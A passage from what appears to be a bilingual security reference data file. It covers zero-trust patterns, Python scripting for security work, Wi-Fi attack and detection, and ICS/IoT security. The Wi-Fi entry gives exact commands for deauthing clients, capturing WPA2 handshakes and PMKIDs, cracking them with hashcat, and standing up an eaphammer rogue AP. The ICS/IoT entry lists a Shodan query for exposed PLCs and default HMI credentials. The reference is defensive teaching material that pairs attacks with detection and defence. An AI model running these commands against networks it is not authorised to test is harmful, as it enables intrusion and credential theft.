  <li><strong>Away.</strong> Long-lived static API keys in CI; perimeter-only firewalls without internal segmentation; on-prem self-built SIEM without managed detection team; Java-native serialization in new code.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Architecture review evaluates the system at its weakest path, not its strongest. If 90% of access uses ZTNA but the legacy VPN still exists for ops, the security posture is determined by the VPN, not the ZTNA. Find the bypass before assuming the pattern works.</div>
`,
      `
<h2>Zero-Trust-Network-Access (ZTNA)</h2>
<ul>
  <li><strong>Muster.</strong> Kein implizites Vertrauen basierend auf Netzwerk-Position. Jeder Request authentifiziert + autorisiert an der Ressource. VPN ersetzt durch Identity-Aware-Proxy oder per-App-Tunnels.</li>
  <li><strong>Häufiger Fehler.</strong> Legacy-Services per "Trusted-Network"-Ausnahme angedockt. Jede Ausnahme erodiert das Modell. Sunset-Liste mit Deadlines, keine Allowlist ohne Review.</li>
  <li><strong>Vendors.</strong> Cloudflare Access, Zscaler Private Access, Tailscale, Google BeyondCorp, Microsoft Entra Private Access. Wahl nach IdP-Fit + Protokollabdeckung (HTTP-only vs Full L4).</li>
</ul>

<h2>Identity-Aware-Proxy</h2>
<ul>
  <li><strong>Muster.</strong> Einziger Ingress pro App; Proxy authentifiziert User gegen IdP, hängt Identity-Header an, leitet weiter. Backend vertraut nur dem Proxy.</li>
  <li><strong>Häufiger Fehler.</strong> Backend erreichbar unter Umgehung des Proxy (Private-IP exponiert, Container-Port-Forward, versehentlicher Public-LB). Audit: Backend direkt aus Peer-Netz zu treffen versuchen.</li>
  <li><strong>Härtung.</strong> mTLS zwischen Proxy und Backend; Backend lehnt jedes Cert außer dem des Proxys ab. Signierte Identity-Header (JWT), damit Backend Herkunft verifizieren kann.</li>
</ul>

<h2>Secrets-Manager-gestützter Credential-Flow</h2>
<ul>
  <li><strong>Muster.</strong> Apps halten nie langlebige Secrets. App-Identität (Workload-Identity, IAM-Role, Pod-SA) → Secrets-Manager → kurzlebige Credential.</li>
  <li><strong>Vendors.</strong> HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager, Doppler, 1Password Connect.</li>
  <li><strong>Häufiger Fehler.</strong> Bootstrap-Problem gelöst durch Hardcodieren des Bootstrap-Tokens im AMI/Image. Audit: Images nach bekannten Token-Formaten greppen.</li>
  <li><strong>Rotation.</strong> Automatisiert, geplant, beobachtbar. Vault-Dynamic-Secrets sind das kanonische Beispiel — DB-Credentials gültig 1 Stunde, on-demand regeneriert.</li>
</ul>

<h2>Secure-Software-Delivery-Pipeline</h2>
<ul>
  <li><strong>Muster.</strong> Code → CI → signiertes Artifact → Registry → Policy-Gate → Deploy. Jede Transition signiert und geloggt.</li>
  <li><strong>Signing.</strong> Sigstore (cosign) für Container, in-toto-Attestations für Build-Provenance, SLSA-Framework für Maturity-Ranking.</li>
  <li><strong>Policy-Gates.</strong> OPA/Gatekeeper oder Kyverno in K8s; Admission-Controller lehnen unsignierte oder nicht-policy-konforme Deployments ab.</li>
  <li><strong>Häufiger Fehler.</strong> CI-Runner hat breite Cloud-Permissions (deployt mit Admin-Role). Pipeline-Compromise → Cloud-Compromise. Verteidigung: Per-Job-Federated-Identity, gescoped auf Deploy-Target.</li>
</ul>

<h2>SOC-Integrations-Muster</h2>
<ul>
  <li><strong>Detection-as-Code.</strong> Detection-Rules versioniert in git, in CI getestet, via Pipeline deployed. Sigma-Format → SIEM-spezifische Kompilierung.</li>
  <li><strong>SOAR-Runbooks.</strong> Jeder Alert mappt auf Runbook mit expliziten Entscheidungspunkten und automatisierbaren Schritten. Manuelle Triage als Fallback, nicht Default.</li>
  <li><strong>Threat-Intel-Ingestion.</strong> STIX-/TAXII-Feeds → SIEM-Watchlists. Qualität &gt; Volumen; ein kuratierter Paid-Feed schlägt fünf kostenlose Firehoses.</li>
</ul>

<h2>Regulierte-Industrie-Varianten</h2>
<ul>
  <li><strong>Finanzen.</strong> Starke Betonung auf Segregation-of-Duties; Change-Management mit Mehr-Personen-Gates; tamper-evidentes Logging (oft Append-Only S3 + Object Lock).</li>
  <li><strong>Healthcare.</strong> HIPAA-getriebene PHI-Segregation; Minimum-Necessary-Access; BAA-Chain mit jedem Vendor, der PHI berührt.</li>
  <li><strong>Government.</strong> FedRAMP / IL4–IL6-Deployment-Muster; FIPS-validierte Crypto; Supply-Chain-Attestation-Anforderungen.</li>
  <li><strong>Kritische Infrastruktur.</strong> NERC CIP / NIS2 — physische Sicherheit, IT-/OT-Segmentierung, verpflichtende Incident-Reporting-Zeitleisten.</li>
</ul>

<h2>Tech-Trends (aktuell)</h2>
<ul>
  <li><strong>Hin zu.</strong> Workload-Identity-Federation (tötet statische Cloud-Creds in CI); eBPF-basierte Runtime-Security; Supply-Chain-SBOM + Signing; SaaS-SIEM mit managed Detections.</li>
  <li><strong>Weg von.</strong> Langlebigen statischen API-Keys in CI; Perimeter-only Firewalls ohne interne Segmentierung; On-Prem-Self-Built-SIEM ohne Managed-Detection-Team; Java-native Serialization in neuem Code.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Architektur-Review bewertet das System am schwächsten Pfad, nicht am stärksten. Wenn 90% des Zugriffs ZTNA nutzt, aber das Legacy-VPN noch für Ops existiert, bestimmt das VPN die Sicherheits-Haltung, nicht das ZTNA. Den Bypass finden, bevor man annimmt, das Muster funktioniert.</div>
`
    ),
    phases: ["recon", "report"]
  },
  {
    id: "python-and-tooling-scripting",
    domain: "cloud-infrastructure", tier: 3,
    title: T("Python for Security Automation", "Python für Security-Automation"),
    blurb: T(
      "Python idioms specific to security work: subprocess discipline, robust HTTP, async scanners, and the regex patterns recurring in log triage.",
      "Python-Idiome speziell für Sicherheits-Arbeit: Subprocess-Disziplin, robuste HTTP-Aufrufe, Async-Scanner und die Regex-Muster, die in der Log-Triage wiederkehren."
    ),
    body: B(
      `
<h2>Subprocess discipline</h2>
<ul>
  <li><strong>Never use <code>shell=True</code> with user input.</strong> Shell injection is trivial. Use the list form: <code>subprocess.run(["nmap", "-sS", target])</code>.</li>
  <li><strong>Capture both streams.</strong> <code>capture_output=True</code> + <code>text=True</code>. Tools write progress to stderr; ignoring it loses half the signal.</li>
  <li><strong>Encoding.</strong> <code>encoding="utf-8", errors="replace"</code>. Real tool output contains binary garbage; default strict mode raises on every odd byte.</li>
  <li><strong>Timeout.</strong> <code>timeout=300</code> always. A hung subprocess in a 10-thread scanner = a wedged scanner. Catch <code>subprocess.TimeoutExpired</code> and move on.</li>
  <li><strong>Long output.</strong> Stream via <code>Popen</code> with <code>stdout=subprocess.PIPE</code> and read line-by-line. <code>capture_output</code> buffers everything in memory and OOMs on big nmap runs.</li>
</ul>

<h2>Robust HTTP</h2>
<pre><code>import httpx
from tenacity import retry, stop_after_attempt, wait_exponential

@retry(
    stop=stop_after_attempt(5),
    wait=wait_exponential(multiplier=1, min=1, max=30),
)
async def fetch(client, url):
    r = await client.get(url, timeout=15.0, follow_redirects=False)
    if r.status_code == 429:
        retry_after = int(r.headers.get("retry-after", "5"))
        await asyncio.sleep(retry_after)
        r.raise_for_status()
    return r
</code></pre>
<ul>
  <li><strong>httpx over requests.</strong> Native async, HTTP/2, sane timeouts.</li>
  <li><strong>follow_redirects=False by default.</strong> SSRF probes and login flows both need to inspect redirects, not chase them.</li>
  <li><strong>Honor Retry-After.</strong> Ignoring it accelerates the rate-limit; honoring it gets through.</li>
  <li><strong>Per-request timeout.</strong> Connect + read + write + pool. Tuple form: <code>timeout=httpx.Timeout(5.0, read=10.0)</code>.</li>
</ul>

<h2>Async scanner pattern</h2>
<pre><code>import asyncio
import httpx

async def scan(targets, concurrency=50):
    sem = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient() as client:
        async def one(t):
            async with sem:
                try:
                    return await fetch(client, t)
                except Exception as e:
                    return ("error", t, str(e))
        return await asyncio.gather(*[one(t) for t in targets])
</code></pre>
<ul>
  <li><strong>Semaphore for concurrency cap.</strong> Without it, asyncio happily opens 10000 sockets and hangs the event loop.</li>
  <li><strong>Catch exceptions per-task.</strong> Otherwise one ConnectionRefused kills the entire gather.</li>
  <li><strong>Single AsyncClient.</strong> Reuse the connection pool; per-request client creation negates async benefit.</li>
</ul>

<h2>Regex — patterns and ReDoS</h2>
<ul>
  <li><strong>Avoid nested quantifiers.</strong> <code>(a+)+</code>, <code>(a|a)*</code>, <code>(a*)*</code> — all catastrophic. Linear input × exponential time.</li>
  <li><strong>Avoid alternation with overlapping prefixes.</strong> <code>(abc|ab|a)*</code> — backtracking explodes. Anchor or factor out the prefix.</li>
  <li><strong>Use possessive quantifiers or atomic groups</strong> if your engine supports them — <code>(?&gt;...)</code> in PCRE prevents backtracking into the group.</li>
  <li><strong>Set a regex timeout.</strong> Python's <code>re</code> has no built-in timeout. Use <code>re2</code> for untrusted input (linear time guaranteed).</li>
  <li><strong>Common security regexes.</strong>
    <ul>
      <li>Email loose: <code>r"[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}"</code> (case-insensitive).</li>
      <li>IPv4: <code>r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b"</code>.</li>
      <li>Bearer token: <code>r"[Bb]earer\\s+([A-Za-z0-9_\\-\\.=]+)"</code>.</li>
      <li>UUIDv4: <code>r"[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}"</code>.</li>
    </ul>
  </li>
</ul>

<h2>Log triage — pandas idioms</h2>
<pre><code>import pandas as pd

df = pd.read_json("auth.log.json", lines=True)
suspicious = (
    df.assign(ts=pd.to_datetime(df.timestamp))
      .query("event_type == 'login_failed'")
      .groupby("source_ip")
      .agg(count=("ts","size"), first=("ts","min"), last=("ts","max"))
      .query("count &gt; 50")
      .sort_values("count", ascending=False)
)
</code></pre>
<div class="rs-rule"><strong>Rule of thumb</strong>A security script that doesn't have timeouts on every subprocess and HTTP call will eventually hang in production. The 10 minutes spent adding timeouts pays for itself the first time the script doesn't deadlock at 3am.</div>
`,
      `
<h2>Subprocess-Disziplin</h2>
<ul>
  <li><strong>Niemals <code>shell=True</code> mit User-Input.</strong> Shell-Injection trivial. List-Form nutzen: <code>subprocess.run(["nmap", "-sS", target])</code>.</li>
  <li><strong>Beide Streams capturen.</strong> <code>capture_output=True</code> + <code>text=True</code>. Tools schreiben Progress nach stderr; ignorieren verliert die Hälfte des Signals.</li>
  <li><strong>Encoding.</strong> <code>encoding="utf-8", errors="replace"</code>. Echter Tool-Output enthält binären Müll; Default-Strict-Mode raised auf jedes komische Byte.</li>
  <li><strong>Timeout.</strong> Immer <code>timeout=300</code>. Hängender Subprocess in 10-Thread-Scanner = wedged Scanner. <code>subprocess.TimeoutExpired</code> catchen, weitermachen.</li>
  <li><strong>Langer Output.</strong> Streamen via <code>Popen</code> mit <code>stdout=subprocess.PIPE</code> und zeilenweise lesen. <code>capture_output</code> buffert alles im RAM und OOMt bei großen nmap-Läufen.</li>
</ul>

<h2>Robustes HTTP</h2>
<pre><code>import httpx
from tenacity import retry, stop_after_attempt, wait_exponential

@retry(
    stop=stop_after_attempt(5),
    wait=wait_exponential(multiplier=1, min=1, max=30),
)
async def fetch(client, url):
    r = await client.get(url, timeout=15.0, follow_redirects=False)
    if r.status_code == 429:
        retry_after = int(r.headers.get("retry-after", "5"))
        await asyncio.sleep(retry_after)
        r.raise_for_status()
    return r
</code></pre>
<ul>
  <li><strong>httpx statt requests.</strong> Native async, HTTP/2, sane Timeouts.</li>
  <li><strong>follow_redirects=False per default.</strong> SSRF-Probes und Login-Flows wollen Redirects inspizieren, nicht jagen.</li>
  <li><strong>Retry-After honorieren.</strong> Ignorieren beschleunigt Rate-Limit; Honorieren kommt durch.</li>
  <li><strong>Per-Request-Timeout.</strong> Connect + read + write + pool. Tuple-Form: <code>timeout=httpx.Timeout(5.0, read=10.0)</code>.</li>
</ul>

<h2>Async-Scanner-Muster</h2>
<pre><code>import asyncio
import httpx

async def scan(targets, concurrency=50):
    sem = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient() as client:
        async def one(t):
            async with sem:
                try:
                    return await fetch(client, t)
                except Exception as e:
                    return ("error", t, str(e))
        return await asyncio.gather(*[one(t) for t in targets])
</code></pre>
<ul>
  <li><strong>Semaphore für Concurrency-Cap.</strong> Ohne öffnet asyncio fröhlich 10000 Sockets und hängt den Event-Loop.</li>
  <li><strong>Exceptions pro Task catchen.</strong> Sonst killt ein ConnectionRefused den ganzen gather.</li>
  <li><strong>Einzelner AsyncClient.</strong> Connection-Pool wiederverwenden; per-Request-Client-Erstellung negiert Async-Nutzen.</li>
</ul>

<h2>Regex — Muster und ReDoS</h2>
<ul>
  <li><strong>Nested Quantifiers vermeiden.</strong> <code>(a+)+</code>, <code>(a|a)*</code>, <code>(a*)*</code> — alle katastrophal. Linearer Input × exponentielle Zeit.</li>
  <li><strong>Alternation mit überlappenden Prefixes vermeiden.</strong> <code>(abc|ab|a)*</code> — Backtracking explodiert. Anchoren oder Prefix herausziehen.</li>
  <li><strong>Possessive Quantifier oder Atomic Groups nutzen</strong> wenn die Engine sie unterstützt — <code>(?&gt;...)</code> in PCRE verhindert Backtracking in die Gruppe.</li>
  <li><strong>Regex-Timeout setzen.</strong> Pythons <code>re</code> hat keinen Built-in-Timeout. <code>re2</code> für untrusted Input (lineare Zeit garantiert).</li>
  <li><strong>Häufige Security-Regexes.</strong>
    <ul>
      <li>Email loose: <code>r"[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}"</code> (case-insensitive).</li>
      <li>IPv4: <code>r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b"</code>.</li>
      <li>Bearer-Token: <code>r"[Bb]earer\\s+([A-Za-z0-9_\\-\\.=]+)"</code>.</li>
      <li>UUIDv4: <code>r"[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}"</code>.</li>
    </ul>
  </li>
</ul>

<h2>Log-Triage — pandas-Idiome</h2>
<pre><code>import pandas as pd

df = pd.read_json("auth.log.json", lines=True)
suspicious = (
    df.assign(ts=pd.to_datetime(df.timestamp))
      .query("event_type == 'login_failed'")
      .groupby("source_ip")
      .agg(count=("ts","size"), first=("ts","min"), last=("ts","max"))
      .query("count &gt; 50")
      .sort_values("count", ascending=False)
)
</code></pre>
<div class="rs-rule"><strong>Faustregel</strong>Ein Security-Skript ohne Timeouts auf jedem Subprocess und HTTP-Call hängt irgendwann in Produktion. Die 10 Minuten für das Hinzufügen von Timeouts amortisieren sich beim ersten Mal, wenn das Skript nachts um 3 Uhr nicht deadlocked.</div>
`
    ),
    phases: []
  },

  // ─────────────────────────────────────────────────────────────
  // 04 — OT & EMBEDDED
  // ─────────────────────────────────────────────────────────────
  {
    id: "wifi-attack-mindmap",
    domain: "ot-embedded", tier: 2,
    title: T("Wi-Fi Attack & Detection", "Wi-Fi — Angriff & Detektion"),
    blurb: T(
      "Wireless attack surface across WPA2/WPA3 and enterprise EAP variants, with the practical detection telltales for each technique.",
      "Wireless-Angriffsfläche über WPA2/WPA3 und Enterprise-EAP-Varianten, mit praxisrelevanten Detektionsmerkmalen pro Technik."
    ),
    body: B(
      `
<h2>WPA2-PSK — handshake capture and crack</h2>
<ol>
  <li><strong>Monitor mode.</strong> <code>airmon-ng check kill && airmon-ng start wlan0</code>. Stops NetworkManager from kicking the interface.</li>
  <li><strong>Recon.</strong> <code>airodump-ng wlan0mon</code>. Note BSSID, channel, connected clients.</li>
  <li><strong>Targeted capture.</strong> <code>airodump-ng -c CH --bssid BSSID -w cap wlan0mon</code>. Wait for handshake (organic) or deauth one client: <code>aireplay-ng --deauth 5 -a BSSID -c CLIENT wlan0mon</code>.</li>
  <li><strong>PMKID fallback.</strong> <code>hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1</code>. Single-frame capture, no clients needed if AP supports PMKID.</li>
  <li><strong>Convert.</strong> <code>hcxpcapngtool -o hash.hc22000 cap.pcapng</code>.</li>
  <li><strong>Crack — wordlist + rule.</strong> <code>hashcat -m 22000 hash.hc22000 rockyou.txt -r OneRuleToRuleThemAll.rule -O</code>.</li>
  <li><strong>Crack — mask.</strong> If you know the SSID convention has a phone number suffix: <code>hashcat -m 22000 hash.hc22000 -a 3 SSID?d?d?d?d?d?d?d</code>.</li>
</ol>

<h2>WPA3 / SAE</h2>
<ul>
  <li><strong>Different shape.</strong> SAE = Simultaneous Authentication of Equals. No four-way handshake to capture; offline brute is not the path.</li>
  <li><strong>Dragonblood downgrade.</strong> Forced WPA2 fallback in transition mode (mixed WPA2/WPA3) → capture WPA2 handshake, crack as usual.</li>
  <li><strong>Side-channel.</strong> Original Dragonblood timing side-channel patched in modern hostapd, but configuration-error variants still seen in legacy embedded.</li>
  <li><strong>Defense.</strong> WPA3-only mode (no transition). hostapd ≥ 2.10. Don't run WPA3 on hardware that lacks the side-channel fixes.</li>
</ul>

<h2>Enterprise — EAP variants</h2>
<ul>
  <li><strong>PEAP-MSCHAPv2 (most common, weakest).</strong> Client sees server cert, validates if configured. Misconfigured client (no CA pin, "Trust Any Cert" checked) → rogue-AP captures challenge/response → offline brute the NTLM hash.</li>
  <li><strong>EAP-TTLS-PAP.</strong> Plaintext password inside TLS tunnel. Same rogue-AP attack → plaintext credentials directly.</li>
  <li><strong>EAP-TLS.</strong> Mutual cert auth. No password to capture. Operational cost: PKI infrastructure, cert lifecycle. Hardest to break, easiest to operate badly.</li>
  <li><strong>Rogue-AP toolchain.</strong> <code>eaphammer -i wlan0mon --essid CORP --auth wpa-eap --creds</code> stands up rogue with same SSID + cert. Client roams.</li>
</ul>

<h2>Detection telltales for the blue team</h2>
<ul>
  <li><strong>Deauth frames.</strong> Floods of management-frame deauths from non-AP MACs. Wireless IDS (Aruba, Cisco WIPS) detects.</li>
  <li><strong>Rogue AP with same SSID.</strong> Signal-strength anomaly: known APs at known floors, sudden new AP with same SSID at unexpected location/signal.</li>
  <li><strong>EAP from unexpected supplicants.</strong> RADIUS logs show EAP attempts from unknown calling-station-ID (MAC).</li>
  <li><strong>PMKID requests.</strong> hcxdumptool-style PMKID probes leave a recognizable pattern on AP logs if AP exports them.</li>
</ul>

<h2>Defense — what actually works</h2>
<ul>
  <li><strong>PSK ≥ 20 random chars.</strong> Otherwise the rockyou+rules pass cracks it.</li>
  <li><strong>WPA3-only.</strong> Drop WPA2 if your client fleet supports it.</li>
  <li><strong>EAP-TLS or PEAP with strict client validation.</strong> Lock the cert pin; reject any cert not from your CA. Test the lock by standing up a rogue with self-signed cert and confirming clients refuse.</li>
  <li><strong>MFP (Management Frame Protection).</strong> Defeats deauth attacks. 802.11w; default in WPA3, optional in WPA2.</li>
  <li><strong>Wireless IDS deployed and tuned.</strong> Untuned WIDS is a checkbox; tuned WIDS catches rogue-AP and deauth floods.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Most wireless wins still come from misconfigured WPA2-Enterprise clients ("Trust Any Cert" toggled on for convenience), not from cryptographic weaknesses. Audit the client-side trust configuration, not just the AP-side protocol.</div>
`,
      `
<h2>WPA2-PSK — Handshake-Capture und Crack</h2>
<ol>
  <li><strong>Monitor-Mode.</strong> <code>airmon-ng check kill && airmon-ng start wlan0</code>. Stoppt NetworkManager vom Kicken des Interfaces.</li>
  <li><strong>Recon.</strong> <code>airodump-ng wlan0mon</code>. BSSID, Channel, connected Clients notieren.</li>
  <li><strong>Targeted Capture.</strong> <code>airodump-ng -c CH --bssid BSSID -w cap wlan0mon</code>. Auf Handshake warten (organisch) oder einen Client deauthen: <code>aireplay-ng --deauth 5 -a BSSID -c CLIENT wlan0mon</code>.</li>
  <li><strong>PMKID-Fallback.</strong> <code>hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1</code>. Single-Frame-Capture, keine Clients nötig wenn AP PMKID unterstützt.</li>
  <li><strong>Konvertieren.</strong> <code>hcxpcapngtool -o hash.hc22000 cap.pcapng</code>.</li>
  <li><strong>Cracken — Wordlist + Rule.</strong> <code>hashcat -m 22000 hash.hc22000 rockyou.txt -r OneRuleToRuleThemAll.rule -O</code>.</li>
  <li><strong>Cracken — Mask.</strong> Wenn SSID-Convention bekannt einen Tel-Nummer-Suffix hat: <code>hashcat -m 22000 hash.hc22000 -a 3 SSID?d?d?d?d?d?d?d</code>.</li>
</ol>

<h2>WPA3 / SAE</h2>
<ul>
  <li><strong>Andere Form.</strong> SAE = Simultaneous Authentication of Equals. Kein Vier-Wege-Handshake zum Capturen; Offline-Brute ist nicht der Pfad.</li>
  <li><strong>Dragonblood-Downgrade.</strong> Erzwungener WPA2-Fallback in Transition-Mode (mixed WPA2/WPA3) → WPA2-Handshake capturen, normal cracken.</li>
  <li><strong>Side-Channel.</strong> Original Dragonblood-Timing-Side-Channel in modernem hostapd gepatcht, aber Konfigurations-Fehler-Varianten noch in Legacy-Embedded gesehen.</li>
  <li><strong>Verteidigung.</strong> WPA3-only-Mode (keine Transition). hostapd ≥ 2.10. WPA3 nicht auf Hardware, der die Side-Channel-Fixes fehlen.</li>
</ul>

<h2>Enterprise — EAP-Varianten</h2>
<ul>
  <li><strong>PEAP-MSCHAPv2 (häufigste, schwächste).</strong> Client sieht Server-Cert, validiert wenn konfiguriert. Misconfigured Client (kein CA-Pin, "Trust Any Cert" gesetzt) → Rogue-AP capturet Challenge/Response → offline NTLM-Hash brute.</li>
  <li><strong>EAP-TTLS-PAP.</strong> Klartext-Passwort im TLS-Tunnel. Gleicher Rogue-AP-Angriff → Klartext-Credentials direkt.</li>
  <li><strong>EAP-TLS.</strong> Mutual Cert-Auth. Kein Passwort zu capturen. Op-Kosten: PKI-Infrastruktur, Cert-Lifecycle. Am schwersten zu brechen, am leichtesten schlecht zu betreiben.</li>
  <li><strong>Rogue-AP-Toolchain.</strong> <code>eaphammer -i wlan0mon --essid CORP --auth wpa-eap --creds</code> stellt Rogue mit gleicher SSID + Cert auf. Client roamt.</li>
</ul>

<h2>Detektions-Merkmale fürs Blue-Team</h2>
<ul>
  <li><strong>Deauth-Frames.</strong> Floods von Management-Frame-Deauths von Non-AP-MACs. Wireless-IDS (Aruba, Cisco WIPS) detektiert.</li>
  <li><strong>Rogue-AP mit gleicher SSID.</strong> Signal-Strength-Anomalie: bekannte APs auf bekannten Etagen, plötzlich neuer AP mit gleicher SSID an unerwartetem Ort/Signal.</li>
  <li><strong>EAP von unerwarteten Supplicants.</strong> RADIUS-Logs zeigen EAP-Attempts von unbekannten Calling-Station-IDs (MAC).</li>
  <li><strong>PMKID-Requests.</strong> hcxdumptool-style PMKID-Probes hinterlassen erkennbares Muster in AP-Logs, wenn AP es exportiert.</li>
</ul>

<h2>Verteidigung — was tatsächlich funktioniert</h2>
<ul>
  <li><strong>PSK ≥ 20 random Zeichen.</strong> Sonst cracked rockyou+rules-Pass es.</li>
  <li><strong>WPA3-only.</strong> WPA2 droppen, wenn die Client-Flotte es unterstützt.</li>
  <li><strong>EAP-TLS oder PEAP mit strikter Client-Validation.</strong> Cert-Pin locken; jeden Cert nicht von deiner CA ablehnen. Lock testen, indem man Rogue mit Self-Signed aufstellt und bestätigt, dass Clients ablehnen.</li>
  <li><strong>MFP (Management Frame Protection).</strong> Schlägt Deauth-Attacks. 802.11w; default in WPA3, optional in WPA2.</li>
  <li><strong>Wireless-IDS deployed und getuned.</strong> Untuned WIDS ist Checkbox; getuned WIDS fängt Rogue-AP und Deauth-Floods.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Die meisten Wireless-Wins kommen weiterhin aus misconfigured WPA2-Enterprise-Clients ("Trust Any Cert" der Bequemlichkeit halber an), nicht aus kryptografischen Schwächen. Die Client-seitige Trust-Konfiguration auditen, nicht nur das AP-seitige Protokoll.</div>
`
    ),
    phases: ["recon"]
  },
  {
    id: "ics-and-iot-security",
    domain: "ot-embedded", tier: 3,
    title: T("ICS & IoT — Security Reference", "ICS & IoT — Sicherheitsreferenz"),
    blurb: T(
      "Where industrial control systems and IoT surface meet, where their threat models diverge, and the CSA-aligned reference for device, edge, network, cloud, and lifecycle.",
      "Wo sich ICS und IoT-Flächen treffen, wo ihre Bedrohungsmodelle auseinanderlaufen und die CSA-orientierte Referenz für Device, Edge, Netzwerk, Cloud und Lifecycle."
    ),
    body: B(
      `
<h2>ICS — Purdue model and protocols</h2>
<ul>
  <li><strong>Purdue levels.</strong> L0 sensors/actuators, L1 PLCs, L2 HMI/SCADA, L3 site control + historian, L3.5 DMZ, L4–L5 enterprise IT. Segmentation between levels = the single most important control.</li>
  <li><strong>Modbus TCP (port 502).</strong> No auth, no encryption. Any reachable client can read/write registers. <code>modbus-cli</code> or Python <code>pymodbus</code> for testing.</li>
  <li><strong>DNP3 (20000).</strong> Has Secure Authentication v5 in spec; almost never deployed. Most field equipment runs DNP3 plain.</li>
  <li><strong>Siemens S7 (102).</strong> S7CommPlus has auth + crypto; legacy S7Comm doesn't. Mixed fleets very common.</li>
  <li><strong>EtherNet/IP (44818).</strong> Allen-Bradley/Rockwell. CIP services exposed; no auth by default.</li>
  <li><strong>OPC UA (4840).</strong> Modern, supports cert auth and encryption. Often deployed with anonymous policy enabled "for testing".</li>
</ul>

<h2>ICS — engagement rules</h2>
<ul>
  <li><strong>Never scan blind.</strong> A standard nmap <code>-sV</code> can crash a PLC. Use protocol-aware tools (<code>plcscan</code>, <code>nmap --script s7-info</code>) at controlled rates only.</li>
  <li><strong>Maintenance window required.</strong> Active testing in production is a written off-line/handover step. Most clients will not authorize live active testing — passive only.</li>
  <li><strong>Passive baseline.</strong> Span port + Zeek with ICS protocol parsers. Inventory, vendor, firmware versions, anomalous external connections.</li>
  <li><strong>Test in a replica lab.</strong> Real PLCs + simulated I/O. Don't test active exploitation against the live process.</li>
</ul>

<h2>ICS — recurring findings</h2>
<ul>
  <li><strong>Flat L2 between IT and OT.</strong> A compromised workstation can speak Modbus to every PLC. Demand IT/OT segmentation gateway (CheckPoint 1570R, Cisco IE3000, Hirschmann).</li>
  <li><strong>Direct internet exposure.</strong> Shodan <code>port:502 country:DE</code>. Still finds PLCs every week.</li>
  <li><strong>Default web HMI creds.</strong> <code>admin:admin</code> on Schneider Magelis, Wonderware, B&amp;R, Mitsubishi web HMIs.</li>
  <li><strong>Unpatched firmware.</strong> Vendor patches lag behind IT by years; field firmware lags vendor patches by years. Cumulative gap commonly 5+ years.</li>
  <li><strong>Remote support tunnels.</strong> Vendor support left a TeamViewer/AnyDesk hot for years. Find and document.</li>
</ul>

<h2>IoT — CSA-aligned audit layers</h2>
<ul>
  <li><strong>Device.</strong> Firmware extraction (<code>binwalk</code>, UART/JTAG/SPI dump), strings analysis for hardcoded creds, debug interfaces left enabled. <code>fwup</code> tool checks for signed firmware.</li>
  <li><strong>Edge.</strong> Local communication (BLE, Zigbee, Z-Wave, Matter/Thread). Pairing flow review, key storage, mesh isolation between rooms/tenants.</li>
  <li><strong>Network.</strong> WAN protocol (MQTT, CoAP, HTTP), TLS posture, cert pinning, mutual auth.</li>
  <li><strong>Cloud.</strong> Companion API — same web-app audit as any SaaS. AuthZ across user/device/admin roles. Most takeovers happen here.</li>
  <li><strong>Lifecycle.</strong> Update channel (signed? rollback-protected? attacker-disable-able?). End-of-life policy (does the cloud-side keep working after vendor sunsets the model?). Vulnerability-disclosure path.</li>
</ul>

<h2>Common IoT findings</h2>
<ul>
  <li><strong>Hardcoded creds in firmware.</strong> <code>strings firmware.bin | grep -i 'pass\\|user\\|key'</code>.</li>
  <li><strong>Cloud API trusts device-side identity claims.</strong> Spoof device ID in cloud request → access any user's data.</li>
  <li><strong>Unencrypted local mesh.</strong> Zigbee with default network key.</li>
  <li><strong>Companion app stores cloud token in plain SharedPreferences.</strong> Any malicious app on same Android device reads it.</li>
  <li><strong>No revocation.</strong> Stolen device, lost device — cloud has no way to invalidate the device's auth token without resetting the user.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For ICS, passive observation always; active testing only in a lab replica or under a written maintenance window with the plant operator standing by. For IoT, the cloud-side companion API is usually the path with the most impact and the least operational risk.</div>
`,
      `
<h2>ICS — Purdue-Modell und Protokolle</h2>
<ul>
  <li><strong>Purdue-Levels.</strong> L0 Sensoren/Aktoren, L1 PLCs, L2 HMI/SCADA, L3 Site-Control + Historian, L3.5 DMZ, L4–L5 Enterprise-IT. Segmentierung zwischen Levels = wichtigste Einzelkontrolle.</li>
  <li><strong>Modbus TCP (Port 502).</strong> Keine Auth, keine Verschlüsselung. Jeder erreichbare Client kann Register lesen/schreiben. <code>modbus-cli</code> oder Python <code>pymodbus</code> zum Testen.</li>
  <li><strong>DNP3 (20000).</strong> Hat Secure Authentication v5 in der Spec; fast nie deployed. Meiste Field-Equipment läuft DNP3 plain.</li>
  <li><strong>Siemens S7 (102).</strong> S7CommPlus hat Auth + Crypto; Legacy-S7Comm nicht. Mixed-Flotten sehr häufig.</li>
  <li><strong>EtherNet/IP (44818).</strong> Allen-Bradley/Rockwell. CIP-Services exponiert; default keine Auth.</li>
  <li><strong>OPC UA (4840).</strong> Modern, unterstützt Cert-Auth und Verschlüsselung. Oft deployed mit Anonymous-Policy aktiv "zum Testen".</li>
</ul>

<h2>ICS — Engagement-Regeln</h2>
<ul>
  <li><strong>Nie blind scannen.</strong> Ein Standard-nmap <code>-sV</code> kann einen PLC crashen. Protokoll-bewusste Tools nutzen (<code>plcscan</code>, <code>nmap --script s7-info</code>), nur kontrolliert.</li>
  <li><strong>Wartungsfenster erforderlich.</strong> Aktives Testen in Produktion ist ein schriftlicher Off-Line-/Handover-Schritt. Die meisten Kunden autorisieren kein Live-Active-Testing — nur passiv.</li>
